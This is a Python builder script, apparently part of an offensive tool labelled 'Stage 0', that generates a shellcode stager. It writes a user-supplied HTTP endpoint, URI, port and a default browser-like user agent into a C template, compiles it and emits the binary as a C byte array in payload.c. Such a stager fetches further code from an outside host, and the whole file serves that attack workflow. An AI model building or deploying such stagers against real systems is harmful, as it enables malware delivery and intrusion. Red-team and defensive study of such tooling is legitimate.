import argparse
import os
from prettytable import PrettyTable

def secStr(sectionLetter, varName, varContent):
    return f"D_SEC({sectionLetter}) WCHAR {varName}[] = L\"{varContent}\";\n"

def printShellcode(shContent):
    strFinal = "unsigned char buf[] = \n{\n"
    counter = 1
    strTemp = ""
    for i in shContent:
        strTemp += "0x{:02x}".format(i) + ", "
        if(counter == 16):
            strFinal += strTemp + "\n"
            strTemp = ""
            counter = 0
        counter += 1

    strFinal = strFinal[:-3] + "\n" + "};"
    return strFinal
       

parser = argparse.ArgumentParser()
parser.add_argument("-e","--endpoint", help="Http endpoint, ex : google.fr",type=str,dest='argsUrl',required=True)
parser.add_argument("-u","--uri",help="Endpoint uri, ex : /path/to/shellcode",type=str,dest='argsUri',required=True)
parser.add_argument("-p","--port",help="Http port",type=str,dest="argsPort", required=True)
parser.add_argument("-a","--user-agent",help="User agent",type=str,dest="argsUseragent", required=False)
parser.add_argument('-s', action='store_true', help="Use HTTPS")

args = parser.parse_args()

ascii_art = r"""
  _________                     __         .__   _____.__           .__         
 /   _____/__  _______ ________/  |______  |  |_/ ____\  |__   ____ |__| _____  
 \_____  \\  \/ /\__  \\_  __ \   __\__  \ |  |\   __\|  |  \_/ __ \|  |/     \ 
 /        \\   /  / __ \|  | \/|  |  / __ \|  |_|  |  |   Y  \  ___/|  |  Y Y  \
/_______  / \_/  (____  /__|   |__| (____  /____/__|  |___|  /\___  >__|__|_|  /
        \/            \/                 \/                \/     \/         \/                                 
"""
print(ascii_art)
print("Stage 0 by @RtlDallasFR")

http_url        = args.argsUrl
http_uri        = args.argsUri
http_port       = args.argsPort 
http_useragent  = args.argsUseragent
http_secure     = args.s

secure_content = "FALSE"
if(http_secure == True):
    secure_content = "TRUE"

if(http_useragent == None):
    http_useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

table = PrettyTable()
table.field_names = ["Param", "Value"]
table.align = "l"  

table.add_row(["Http Endpoint", http_url])
table.add_row(["Http Uri", http_uri])
table.add_row(["Http Port", http_port])
table.add_row(["User Agent", http_useragent])
table.add_row(["Use HTTPS", http_secure])

print("\n\tStagger Config")
print(table)
print("\n")

template = open("./src/Main.Template", "r")
content = template.read()
template.close()

session_info = secStr("C", "endpoint", http_url) + secStr("C", "uri", http_uri) + secStr("C", "userAgent", http_useragent)

content = content.replace("$$SESSION_INFO$$", session_info)
content = content.replace("$$PORT$$", http_port)
content = content.replace("$$SECURE$$", secure_content)

output = open("./src/Main.c", "w")
output.write(content)
output.close()

os.system("make")

sh = open("./bin/shellcode.bin", "rb")
sh_content = sh.read() 
sh.close()

sh_c_format = open("./payload.c", "w")
sh_c_format.write(printShellcode(sh_content))
sh_c_format.close()

print("[*] C format shellcode ready in payload.c")
print(f"[*] Shellcode size {len(sh_content)} bytes")